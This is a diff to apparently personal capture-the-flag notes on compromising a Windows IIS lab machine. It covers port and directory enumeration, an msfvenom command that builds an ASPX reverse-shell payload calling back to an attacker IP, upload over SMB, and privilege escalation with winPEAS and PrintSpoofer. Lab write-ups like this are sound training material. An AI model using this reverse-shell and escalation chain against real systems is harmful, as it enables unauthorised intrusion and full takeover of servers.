@@ -63,5 +63,19 @@ It turned out these credentials are useless.
 Rescanning all ports,,,(nmap -v -sV -p1-65535 $TARGET_IP)
 	Discovered open port 49663/tcp on 10.10.2.149
 
-Enumerating $TARGET_IP:49663 using gobuster,,,(gobuster dir -u http://$TARGET_IP:49663 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html,.md,.xml | tee gobuster_on_49663)
+Enumerating $TARGET_IP:49663 using gobuster,,,(gobuster dir -u http://$TARGET_IP:49663 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster_on_49663)
+	found a directory named nt4wrksv
 
+Enumerating $TARGET_IP:49663/nt4wrksv using gobuster,,,(gobuster dir -u http://$TARGET_IP:49663/nt4wrksv -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .txt,.md | tee gobuster_on_49663_nt4wrksv)
+	found the same txt file (passwords.txt)
+
+Creating reverse shell payloads in aspx format because this is IIS environment
+	$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.15.55 LPORT=4444 -f aspx -o revshell.aspx
+Uploading this to nt4wrksv directory through smb connection...
+
+Found user.txt in Users/Bob/Desktop
+
+Ran winPEASx64 (output_winpeas)
+
+Ran PrintSpoofer.exe on the system.
+Found root.txt in Users/Administrator/Desktop
